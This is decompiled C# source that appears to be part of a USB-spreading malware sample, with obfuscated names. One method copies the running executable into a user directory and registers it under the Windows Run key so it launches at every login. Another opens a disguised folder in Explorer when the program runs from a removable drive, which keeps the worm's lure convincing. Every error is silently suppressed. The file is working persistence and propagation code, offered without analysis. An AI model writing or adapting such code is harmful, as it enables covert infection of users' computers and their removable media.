using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace uwcrisew;

internal class MAEUSB
{
	public string marparswfilePath = Application.get_ExecutablePath();

	public void marparswload_usb(byte[] fileByt)
	{
		try
		{
			if (!Directory.Exists(marparswSETPS.marparswget_upath()))
			{
				Directory.CreateDirectory(marparswSETPS.marparswget_upath());
			}
			try
			{
				if (marparswfilePath != marparswSETPS.marparswget_upath() + marparswSETPS.marparswusbName + ".exe")
				{
					if (fileByt == null)
					{
						File.Copy(marparswfilePath, marparswSETPS.marparswget_upath() + marparswSETPS.marparswusbName + ".exe", overwrite: true);
					}
					else
					{
						File.WriteAllBytes(marparswSETPS.marparswget_upath() + marparswSETPS.marparswusbName + ".exe", fileByt);
					}
				}
				try
				{
					string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|marparsw";
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
					object value = registryKey.GetValue(marparswSETPS.marparswpc_id + "iub");
					if (value == null)
					{
						registryKey.SetValue(marparswSETPS.marparswpc_id + "iub", marparswSETPS.marparswget_upath() + marparswSETPS.marparswusbName + ".exe");
					}
					else if (value.ToString() != marparswSETPS.marparswget_upath() + marparswSETPS.marparswusbName + ".exe")
					{
						registryKey.SetValue(marparswSETPS.marparswpc_id + "iub", marparswSETPS.marparswget_upath() + marparswSETPS.marparswusbName + ".exe");
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	public void marparswshow_folder()
	{
		try
		{
			if (!(marparswSETPS.marparswget_upath() + marparswSETPS.marparswusbName + ".exe" != marparswfilePath))
			{
				return;
			}
			string directoryName = Path.GetDirectoryName(marparswfilePath);
			string pathRoot = Path.GetPathRoot(directoryName);
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if (!driveInfo.IsReady || driveInfo.DriveType != DriveType.Removable)
				{
					continue;
				}
				string pathRoot2 = Path.GetPathRoot(driveInfo.Name);
				if (pathRoot == pathRoot2)
				{
					string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(marparswfilePath);
					if (Directory.Exists(directoryName + fileNameWithoutExtension))
					{
						Process.Start("explorer.exe", directoryName + fileNameWithoutExtension);
					}
				}
			}
		}
		catch
		{
		}
	}
}
